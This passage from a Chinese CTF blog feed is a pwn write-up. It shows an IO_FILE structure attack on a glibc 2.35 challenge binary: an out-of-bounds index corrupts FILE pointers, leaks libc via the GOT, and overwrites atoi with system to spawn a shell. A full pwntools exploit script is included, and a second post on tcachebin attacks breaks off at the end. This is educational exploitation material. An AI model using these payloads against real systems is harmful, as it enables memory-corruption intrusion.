class="hljs-number">6020</span>C0h<br>.bss:<span class="hljs-number">00000000006020</span>C0                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing<br>.bss:<span class="hljs-number">00000000006020</span>C0                 public <span class="hljs-built_in">stdout</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; FILE *<span class="hljs-built_in">stdout</span><br>.bss:<span class="hljs-number">00000000006020</span>C0 <span class="hljs-built_in">stdout</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="hljs-number">0000000000400470</span>↑o<br>.bss:<span class="hljs-number">00000000006020</span>C0                                         ; deregister_tm_clones+<span class="hljs-number">6</span>↑o ...<br>.bss:<span class="hljs-number">00000000006020</span>C0                                         ; Alternative name is <span class="hljs-string">&#x27;__TMC_END__&#x27;</span><br>.bss:<span class="hljs-number">00000000006020</span>C0                                         ; Copy of shared data<br>.bss:<span class="hljs-number">00000000006020</span>C8                 align <span class="hljs-number">10</span>h<br>.bss:<span class="hljs-number">00000000006020</span>D0                 public <span class="hljs-built_in">stdin</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">00000000006020</span>D0 ; FILE *<span class="hljs-built_in">stdin</span><br>.bss:<span class="hljs-number">00000000006020</span>D0 <span class="hljs-built_in">stdin</span>@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:<span class="hljs-number">0000000000400488</span>↑o<br>.bss:<span class="hljs-number">00000000006020</span>D0                                         ; init+<span class="hljs-number">4</span>↑r<br>.bss:<span class="hljs-number">00000000006020</span>D0                                         ; Alternative name is <span class="hljs-string">&#x27;stdin&#x27;</span><br>.bss:<span class="hljs-number">00000000006020</span>D0                                         ; Copy of shared data<br>.bss:<span class="hljs-number">00000000006020</span>D8 completed_7594  db ?                    ; DATA XREF: __do_global_dtors_aux↑r<br>.bss:<span class="hljs-number">00000000006020</span>D8                                         ; __do_global_dtors_aux+<span class="hljs-number">13</span>↑w<br></code></pre></td></tr></table></figure><p>这些是标准输出，标准输入，还有一个错误输出，分别对应的文件描述符1，0，2</p><p>我们可以看看这个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">$<span class="hljs-number">2</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">26018464</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x0</span>,<br>    _IO_read_end = <span class="hljs-number">0x18d0480</span> <span class="hljs-string">&quot;\300\004\215\001&quot;</span>,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x0</span>,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = <span class="hljs-number">0</span>,<br>    _unused2 = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x0</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>那么可以看见现在是<strong>未初始化的状态</strong>，这个跟前面的house of orange 的file结构体是同一个，不过我们当时伪造的是vtable的虚函数表，现在我们重点来看前9个字段</p><p><strong>_flags</strong>:<br>这是一个标志位，用于保存文件流的状态信息。它可以包含多个标志，比如文件是以文本模式还是二进制模式打开的，流是可读、可写还是处于错误状态等。<code>26018464</code> 这个值表示了一组特定的状态标志。</p><p><strong>_IO_read_ptr</strong>:<br>这是一个指针，指向当前从文件流中读取数据的位置。如果文件流是以读取模式打开的，这个指针会在流中向前移动，指示已经读取到哪里。</p><p><strong>_IO_read_end</strong>:<br>这是一个指针，指向文件流中可读缓冲区的末尾。读取操作不能超过这个位置，否则就需要刷新缓冲区或者读取更多的数据。<code>0x18d0480 &quot;\300\004\215\001&quot;</code> 表示这个缓冲区末尾的位置和包含的内容。</p><p><strong>_IO_read_base</strong>:<br>这是一个指针，指向文件流中可读缓冲区的开始位置。每次读取操作从这个位置开始，并在 <code>_IO_read_ptr</code> 位置结束。</p><p><strong>_IO_write_base</strong>:<br>这是一个指针，指向文件流中可写缓冲区的开始位置。写操作将数据从这个位置开始写入文件流。</p><p><strong>_IO_write_ptr</strong>:<br>这是一个指针，指向文件流中当前写入数据的位置。它随着写入操作向前移动，指示已经写入的数据位置。</p><p><strong>_IO_write_end</strong>:<br>这是一个指针，指向文件流中可写缓冲区的末尾。写入操作不能超过这个位置，否则就需要刷新缓冲区或者扩展缓冲区。</p><p><strong>_IO_buf_base</strong>:<br>这是一个指针，指向用于文件流的缓冲区的开始位置。这个缓冲区可以用来存储读或写的数据。</p><p><strong>_IO_buf_end</strong>:<br>这是一个指针，指向用于文件流的缓冲区的末尾位置。缓冲区的数据不能超过这个位置。</p><h3 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h3><h3 id="2-35本地"><a href="#2-35本地" class="headerlink" title="2.35本地"></a>2.35本地</h3><p>知道了这些我们现在来看一道题目</p><p>首先查看一下保护</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811100245052.png" alt="image-20240811100245052"></p><p>64位ida载入</p><p>两个功能</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811100508961.png" alt="image-20240811100508961"></p><p>create函数会创建一个对象并加入到wizards数组中</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811100720320.png" alt="image-20240811100720320"></p><p>另一个函数会存在数组越界的问题，当我们输入负数的时候数组就会越界，我们可以看见wizards[-2]的位置就是log_file</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811100952432.png" alt="image-20240811100952432"></p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811101051792.png" alt="image-20240811101051792"></p><p>这个函数还会把读入的数据打印出来</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811101729726.png" alt="image-20240811101729726"></p><p>我们可以修改到log_file + 40处的位置，我们可以看一下log_file结构体</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811103123266.png" alt="image-20240811103123266"></p><p>是不是很眼熟，对就是前面说的那个结构体，而他+40处的位置正好是_IO_write_ptr 的位置，也就是我们可以修改这个指针，如果我们能修改到这个结构体，那么我们就可以像打io_stout 一样泄露数据，比如我们可以修改  _IO_read_ptr 为got表，那么下次就会从这里读取数据，并打印出来，那么就可以泄露出libc地址了，当然此时的 _IO_read_end的地址要比 _IO_read_ptr 大，刚刚我们看见的是未初始化的结构体，现在我们给他创建一个对象，进行初始化</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">create(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>wizard(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811103747886.png" alt="image-20240811103747886"></p><p>那么我们现在修改   _IO_write_ptr 指针指向 这个结构体附近</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811103807602.png" alt="image-20240811103807602"></p><p>可以看见两者还是挺近的，我们可以把下标输入为-2那么 _IO_write_ptr指针减去的字节数就是 -50 + 我们输入的字节数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><br><br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">13</span>)<br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br></code></pre></td></tr></table></figure><p>这样之后我们再次看看结构体的内容</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811103834950.png" alt="image-20240811103834950"></p><p>那么现在我们就可以修改结构体内容了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> <br>payload += p64(<span class="hljs-number">0xFBAD24A8</span>)<br>wizard(<span class="hljs-number">0</span>,payload)<br>payload = p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>] + <span class="hljs-number">0x100</span>)<br>wizard(<span class="hljs-number">0</span>,payload)<br>gdb.attach(io)<br>atoi_addr = u64(io.recv(<span class="hljs-number">8</span>))<br>success(<span class="hljs-string">&#x27;atoi_addr----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(atoi_addr))<br>libc_base = atoi_addr - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br></code></pre></td></tr></table></figure><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811104320830.png" alt="image-20240811104320830"></p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811104337883.png" alt="image-20240811104337883"></p><p>注意此时下标用的是0，这样的话 _IO_write_ptr 就不会再减去50，而且因为此时是因为读取完毕了所以  _IO_read_ptr 又加上了0x20</p><p>那么我们如法炮制，修改 _IO_write_ptr 为 atoi的got表</p><p>虽然想的没问题，但是在实际操作中，会发现， _IO_write_ptr 会保持不变，原因是我们写入完数据之后，  _IO_write_ptr 会再次更新，那么就会导致， _IO_write_ptr 再次被覆盖变成 原来的地址+输入的长度。因此直接修改是行不通的。</p><p>在glibc源码里面我们可以分析一下</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811110643203.png" alt="image-20240811110643203"></p><p>当 _IO_read_ptr &lt; _IO_read_end 的时候就会直接返回，不会执行我们下面的对 _IO_write_ptr 赋值的要求，下面会把 _IO_write_ptr 等一系列指针指向 _IO_buf_base,那么我们控制到    _IO_buf_base即可以控制 _IO_write_ptr了，那么我们就要保证修改完 _IO_buf_base 之后  _IO_read_ptr &lt; _IO_read_end 这个条件不满足，为了能修改到 _IO_buf_base，除此之外，我们还要保证 [ _IO_write_ptr  _IO_write_end] _IO_buf_base 位于这两者之间,我们需要知道  _IO_write_ptr 的值那么我们还要泄露 log_file 的地址。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py">wizard(-<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>)<br>login_file = <span class="hljs-number">0x6020E0</span>                    <span class="hljs-comment">#_IO_read_ptr     #_IO_read_end            # _IO_read_base</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xFBAD24A8</span>)<br>wizard(<span class="hljs-number">0</span>,payload)<br>payload =                               p64(login_file) + p64(login_file + <span class="hljs-number">0x50</span>) + p64(login_file)<br><span class="hljs-comment">#gdb.attach(io)</span><br>wizard(<span class="hljs-number">0</span>,payload)<br>gdb.attach(io)<br>log_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>success(<span class="hljs-string">&#x27;log_addr----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(log_addr))<br></code></pre></td></tr></table></figure><p>这个login_file + 0x50 中的 0x50 是一个大概，每次加0x20，只要保证第三次修改之后 _IO_read_ptr   &gt; _IO_read_end,就行了</p><p>得到log_file的真实地址之后，我们就可以修改  _IO_write_base    _IO_write_ptr    _IO_write_end 了，因为之后   _IO_write_ptr 会被覆盖，所以这里使用 0xdeadbeef 来覆盖</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">           <span class="hljs-comment">#_IO_write_base       #_IO_write_ptr        #_IO_write_end </span><br>payload = p64(log_addr + <span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(log_addr + <span class="hljs-number">0x80</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>wizard(<span class="hljs-number">0</span>,payload)<br>payload = p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>] + <span class="hljs-number">0x80</span>) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>] + <span class="hljs-number">0x800</span>)<br>wizard(<span class="hljs-number">0</span>,payload)<br></code></pre></td></tr></table></figure><p>当然现在 _IO_buf_base 的地址不能为 atoi的got表，而是要往下去一点，不然覆盖不到 atoi的got表，而且  _IO_write_end需要取大一点，保证能够正确修改</p><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811121143461.png" alt="image-20240811121143461"></p><p>可以看见我们成功把 _IO_buf_base 处的地址赋值给这些指针</p><p>那么接下来继续使  _IO_write_ptr 修改到 atio的got表位置，之后修改atoi got表为system</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">11</span>)<br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">11</span>)<br><br>wizard(<span class="hljs-number">0</span>,p64(system))<br></code></pre></td></tr></table></figure><p>最后输入 sh就可以拿到shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">io.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2024/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93attack/image-20240811121623137.png" alt="image-20240811121623137"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>io = process(<span class="hljs-string">&#x27;./magic1&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./magic1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendafter(<span class="hljs-string">&#x27;name:&#x27;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wizard</span>(<span class="hljs-params">index,name</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;will spell:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">&#x27;name:&#x27;</span>,name)<br><br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br>create(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>wizard(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br><br><br>gdb.attach(io)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>): <br>    wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><br><br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">13</span>)<br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br><br><span class="hljs-comment">#wizard(-2,&#x27;\x00&#x27;*9)</span><br><span class="hljs-comment">#wizard(-2,&#x27;\x00&#x27;)</span><br><br><br><br><span class="hljs-comment">#gdb.attach(io)</span><br><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>payload += p64(<span class="hljs-number">0xFBAD24A8</span>)  <br>wizard(<span class="hljs-number">0</span>,payload)<br>payload = p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>] + <span class="hljs-number">0x100</span>)<br>wizard(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>atoi_addr = u64(io.recv(<span class="hljs-number">8</span>))  <br>success(<span class="hljs-string">&#x27;atoi_addr----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(atoi_addr))<br>libc_base = atoi_addr - libc.sym[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#gdb.attach(io)</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>wizard(-<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>)<br>login_file = <span class="hljs-number">0x6020E0</span>                    <span class="hljs-comment">#_IO_read_ptr     #_IO_read_end            # _IO_read_base</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xFBAD24A8</span>) <br>wizard(<span class="hljs-number">0</span>,payload)<br>payload =                               p64(login_file) + p64(login_file + <span class="hljs-number">0x50</span>) + p64(login_file)<br><span class="hljs-comment">#gdb.attach(io)</span><br>wizard(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>log_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>success(<span class="hljs-string">&#x27;log_addr----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(log_addr))<br>           <span class="hljs-comment">#_IO_write_base       #_IO_write_ptr        #_IO_write_end </span><br>payload = p64(log_addr + <span class="hljs-number">0x80</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(log_addr + <span class="hljs-number">0x80</span>) <br><span class="hljs-comment">#gdb.attach(io)</span><br>wizard(<span class="hljs-number">0</span>,payload)<br>payload = p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>] + <span class="hljs-number">0x80</span>) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>] + <span class="hljs-number">0x800</span>)<br>wizard(<span class="hljs-number">0</span>,payload)<br>gdb.attach(io)<br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">11</span>)<br>wizard(-<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">11</span>)<br><br>wizard(<span class="hljs-number">0</span>,p64(system))<br><br>io.sendlineafter(<span class="hljs-string">&#x27;choice&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;sh&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>PWN!</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常回家看看之tcachebin-attack</title>
    <link href="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/"/>
    <url>/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/</url>
    
    <content type="html"><![CDATA[<h3 id="常回家看看之tcachebin-attack"><a href="#常回家看看之tcachebin-attack" class="headerlink" title="常回家看看之tcachebin-attack"></a>常回家看看之tcachebin-attack</h3><p>自从glibc2.26之后出现了新的堆管理机制，及引用了tcachebin机制，tcachebin也是主要分配小堆块的，有40条bin链（0x10 - 0x410）</p><p>那么这样的分配有很多和smallbin 和fastbin重叠的部分，及malloc申请之后free掉的小堆块优先进入tcachebin中，这样的分配减小的分配堆时候的开销，而且加速了堆的分配速度，但是由于新引入了tcachebin，那么对它的检查还是没有那么完善，虽然加强了doublefree，检查但是不代表它不存在，举个例子，加入你申请堆块的时候两个堆块指针指向同一个堆块，那么在free的时候就可以实现double free，但是由于tcachebin链表头部有检查，所以可以先放入几个正常的堆块到头部，然后再次把fake chunk链接进去。</p><p>这里注意，之前fastbin对加入链表的size位有检查，但是在tcachebin中，我们可以不用考虑那么多，但是要注意一点，一旦申请到了fakechunk，那么这条链子可能大概率用不了了，所以想要后续的使用要申请别的大小的堆块。</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803151939204.png" alt="image-20240803151939204"></p><p>这里可以看见当同一大小的chunk，tcachebin放满了7个之后才能free进入相应大小的bin链表里面，比如上图进入了unsortbin链表中，而且申请堆块的时候也是优先从tcachebin链表中拿。</p><p>tcachebin出入顺序：先进后出（FILO）跟fastbin一样，而且它们都是单链表也可以叫它们（头插法）拿的时候也是从头拿</p><p>这里和unsortbin区分开，unsortbin和它们刚刚好相反，而且unsortbin还是双链表，对应2.29以下的攻击有unsortbin attack，及任意地址写入main_arner+88的位置</p><h4 id="例题演示"><a href="#例题演示" class="headerlink" title="例题演示"></a>例题演示</h4><h5 id="题目保护情况"><a href="#题目保护情况" class="headerlink" title="题目保护情况"></a>题目保护情况</h5><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803152450949.png" alt="image-20240803152450949"></p><h5 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h5><p>菜单，有add，free，show三个功能</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803152532582.png" alt="image-20240803152532582"></p><p>add函数，申请堆块大小是固定的</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803152628056.png" alt="image-20240803152628056"></p><p>注意这里存在off_by_null</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803152818698.png" alt="image-20240803152818698"></p><p>free函数，free之后指针清空没有UAF漏洞</p><p><img src="/2024/08/03/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Btcachebin-attack/image-20240803152902629.png" alt="image-20240803152902629"></p><p>show函数用puts打印的</p><p><img 